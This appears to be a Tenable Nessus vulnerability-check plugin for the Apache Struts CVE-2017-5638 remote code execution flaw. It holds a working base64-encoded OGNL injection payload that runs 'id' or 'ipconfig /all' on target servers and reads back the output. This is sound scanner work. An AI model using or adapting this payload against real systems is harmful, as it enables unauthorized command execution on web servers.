#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(97610);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2017/05/16 19:26:21 $");

  script_cve_id("CVE-2017-5638");
  script_bugtraq_id(96729);
  script_osvdb_id(153025);
  script_xref(name:"IAVA", value:"2017-A-0052");
  script_xref(name:"CERT", value:"834067");
  script_xref(name:"EDB-ID", value:"41570");
  script_xref(name:"EDB-ID", value:"41614");

  script_name(english:"Apache Struts 2.3.5 - 2.3.31 / 2.5.x < 2.5.10.1 Jakarta Multipart Parser RCE (remote)");
  script_summary(english:"Attempts to execute arbitrary commands on the remote web server.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a web application that uses a Java
framework that is affected by a remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Apache Struts running on the remote host is affected by
a remote code execution vulnerability in the Jakarta Multipart parser
due to improper handling of the Content-Type header. An
unauthenticated, remote attacker can exploit this, via a specially
crafted Content-Type header value in the HTTP request, to potentially
execute arbitrary code, subject to the privileges of the web server
user.");
  script_set_attribute(attribute:"see_also", value:"http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html");
  # https://threatpost.com/apache-struts-2-exploits-installing-cerber-ransomware/124844/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?77e9c654");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1");
  script_set_attribute(attribute:"see_also", value:"https://cwiki.apache.org/confluence/display/WW/S2-045");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache Struts version 2.3.32 / 2.5.10.1 or later.
Alternatively, apply the workaround referenced in the vendor advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts Jakarta Multipart Parser OGNL Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/03/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/03/06");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/03/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = eregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = eregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = eregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

if (max_index(urls) == 0)
  audit(AUDIT_WEB_FILES_NOT, "Struts 2 .action / .do / .jsp", port);

urls = list_uniq(urls);

vuln = FALSE;

# The OGNL exploit has been base64 encoded to evade AV quarantine for certain AV
# vendors.
exploit = "JXsoI189J211bHRpcGFydC9mb3JtLWRhdGEnKS4oI2RtPUBvZ25sLk9nbmxDb250ZX";
exploit += "h0QERFRkFVTFRfTUVNQkVSX0FDQ0VTUykuKCNfbWVtYmVyQWNjZXNzPygjX21lbWJ";
exploit += "lckFjY2Vzcz0jZG0pOigoI2NvbnRhaW5lcj0jY29udGV4dFsnY29tLm9wZW5zeW1w";
exploit += "aG9ueS54d29yazIuQWN0aW9uQ29udGV4dC5jb250YWluZXInXSkuKCNvZ25sVXRpb";
exploit += "D0jY29udGFpbmVyLmdldEluc3RhbmNlKEBjb20ub3BlbnN5bXBob255Lnh3b3JrMi";
exploit += "5vZ25sLk9nbmxVdGlsQGNsYXNzKSkuKCNvZ25sVXRpbC5nZXRFeGNsdWRlZFBhY2t";
exploit += "hZ2VOYW1lcygpLmNsZWFyKCkpLigjb2dubFV0aWwuZ2V0RXhjbHVkZWRDbGFzc2Vz";
exploit += "KCkuY2xlYXIoKSkuKCNjb250ZXh0LnNldE1lbWJlckFjY2VzcygjZG0pKSkpLigja";
exploit += "XN3aW49KEBqYXZhLmxhbmcuU3lzdGVtQGdldFByb3BlcnR5KCdvcy5uYW1lJykudG";
exploit += "9Mb3dlckNhc2UoKS5jb250YWlucygnd2luJykpKS4oI2NtZHM9KCNpc3dpbj97J2N";
exploit += "tZC5leGUnLCcvYycsJ2lwY29uZmlnJywnL2FsbCd9OnsnYmFzaCcsJy1jJywnaWQn";
exploit += "fSkpLigjcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKCNjbWRzKSkuKCNwL";
exploit += "nJlZGlyZWN0RXJyb3JTdHJlYW0odHJ1ZSkpLigjcHJvY2Vzcz0jcC5zdGFydCgpKS";
exploit += "4oI3Jvcz0oQG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEB";
exploit += "nZXRSZXNwb25zZSgpLmdldE91dHB1dFN0cmVhbSgpKSkuKEBvcmcuYXBhY2hlLmNv";
exploit += "bW1vbnMuaW8uSU9VdGlsc0Bjb3B5KCNwcm9jZXNzLmdldElucHV0U3RyZWFtKCksI";
exploit += "3JvcykpLigjcm9zLmZsdXNoKCkpfQo=";

headers = make_array("Content-Type", chomp(base64_decode(str:exploit)));


foreach url (urls)
{
  res = http_send_recv3(
    method       : "GET",
    item         : url,
    port         : port,
    add_headers  : headers,
    exit_on_fail : TRUE
  );

  if ("Windows IP" >< res[2] || "uid" >< res[2])
  {
    if (res[2] =~ "uid=[0-9]+.*gid=[0-9]+.*")
    {
      output = strstr(res[2], "uid");
      if (!empty_or_null(output))
      {
        vuln = TRUE;
        vuln_url = build_url(qs:url, port:port);
        break;
      }
    }
    else if (res[2] =~ "Subnet Mask|Windows IP|IP(v(4|6)?)? Address")
    {
      output = strstr(res[2], "Windows IP");
      if (!empty_or_null(output))
      {
        vuln = TRUE;
        vuln_url = build_url(qs:url, port:port);
        break;
      }
    }
  }

  # Stop after first vulnerable Struts app is found
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(http_last_sent_request()),
  output     : chomp(output)
);
